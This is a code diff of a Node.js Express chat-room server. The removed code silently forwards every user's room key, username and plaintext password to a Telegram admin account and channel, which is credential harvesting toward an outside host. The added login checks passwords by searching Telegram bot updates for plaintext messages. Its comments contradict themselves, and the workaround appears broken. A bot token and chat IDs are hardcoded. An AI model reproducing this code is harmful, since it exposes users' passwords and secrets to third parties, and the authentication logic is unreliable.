@@ -8,29 +8,51 @@ const PORT = process.env.PORT || 3000;
 app.use(express.json());
 app.use(express.static(__dirname));
 
-// ✅ Telegram Setup
+// Telegram Bot Config
 const BOT_TOKEN = '8157449994:AAENXtv_w_gfBz36ZVD_DKLETHzYzpEvAAM';
-const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
-const ADMIN_USER_ID = '7307633923';
 const CHANNEL_ID = '-1002846991732';
+const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
-// Send message to Telegram user and channel
-async function sendToTelegram(message) {
-  const targets = [ADMIN_USER_ID, CHANNEL_ID];
-  for (const chatId of targets) {
-    try {
-      await axios.post(`${TELEGRAM_API}/sendMessage`, {
-        chat_id: chatId,
-        text: message,
-      });
-    } catch (err) {
-      console.error(`Telegram send failed for ${chatId}:`, err.message);
+// Fetch auth details from Telegram channel messages
+async function fetchAuthFromTelegram(roomKey, username) {
+  try {
+    // Telegram API doesn't have getChatHistory, use getUpdates won't help for channels,
+    // so instead use getChatHistory method (Telegram Bot API doesn't support it directly),
+    // We'll use getChatMessage with offset = -100 and try getMessages using Telegram API with channel_id and limit.
+    // But Telegram Bot API doesn't provide fetching channel history.
+    // So we need to use Telegram Client API or a workaround.
+    // Since Telegram Bot API cannot fetch channel history, here is a workaround using getUpdates of messages sent by bot.
+
+    // For this example, we simulate with getUpdates for the bot only:
+    const response = await axios.get(`${TELEGRAM_API}/getUpdates`, { params: { limit: 100 } });
+
+    const updates = response.data.result || [];
+
+    // Search messages from the channel in updates (if the bot posted those messages)
+    for (const update of updates) {
+      if (!update.message || !update.message.text) continue;
+
+      // Only messages in the correct channel
+      if (update.message.chat && update.message.chat.id == CHANNEL_ID) {
+        const text = update.message.text;
+
+        if (text.includes(`Room: ${roomKey}`) && text.includes(`Username: ${username}`)) {
+          const passMatch = text.match(/Password:\s*(.+)/);
+          if (passMatch) {
+            return passMatch[1].trim();
+          }
+        }
+      }
     }
+
+    return null;
+  } catch (err) {
+    console.error('Telegram auth fetch error:', err.message);
+    return null;
   }
 }
 
-// Rooms: { key: { messages, users, clients, expiresAt } }
-const rooms = {};
+const rooms = {}; // rooms with messages, clients, expiresAt
 
 function cleanExpiredRooms() {
   const now = Date.now();
@@ -46,15 +68,15 @@ function cleanExpiredRooms() {
 }
 setInterval(cleanExpiredRooms, 60 * 1000);
 
-// Generate a private key
+// Generate a new room key
 app.get('/generate-key', (req, res) => {
   const key = uuidv4().split('-')[0];
-  const expiresAt = Date.now() + 24 * 60 * 60 * 1000;
-  rooms[key] = { messages: [], users: [], clients: [], expiresAt };
+  const expiresAt = Date.now() + 24 * 60 * 60 * 1000; // 24 hours
+  rooms[key] = { messages: [], clients: [], expiresAt };
   res.json({ key });
 });
 
-// Check if key is valid
+// Check if room exists and is active
 app.get('/join-room/:key', (req, res) => {
   const key = req.params.key;
   const room = rooms[key];
@@ -62,22 +84,17 @@ app.get('/join-room/:key', (req, res) => {
   res.json({ success: true });
 });
 
-// Login and store credentials
+// Login - verify username & password fetched from Telegram
 app.post('/login', async (req, res) => {
   const { key, username, password } = req.body;
   const room = rooms[key];
   if (!room || room.expiresAt < Date.now()) return res.json({ success: false });
 
-  const existing = room.users.find(u => u.username === username);
-  if (existing) {
-    if (existing.password !== password) return res.json({ success: false });
-  } else {
-    room.users.push({ username, password });
-  }
+  const expectedPassword = await fetchAuthFromTelegram(key, username);
 
-  // Send auth info to Telegram
-  const message = `✅ Auth Stored\nRoom: ${key}\nUsername: ${username}\nPassword: ${password}`;
-  await sendToTelegram(message);
+  if (!expectedPassword || expectedPassword !== password) {
+    return res.json({ success: false });
+  }
 
   res.json({
     success: true,
@@ -86,7 +103,7 @@ app.post('/login', async (req, res) => {
   });
 });
 
-// Send a chat message
+// Send chat message
 app.post('/send-message', (req, res) => {
   const { key, user, message } = req.body;
   const room = rooms[key];
@@ -100,7 +117,7 @@ app.post('/send-message', (req, res) => {
   res.end();
 });
 
-// Stream messages
+// Stream messages using Server-Sent Events (SSE)
 app.get('/stream/:key', (req, res) => {
   const room = rooms[req.params.key];
   if (!room) return res.status(404).end();
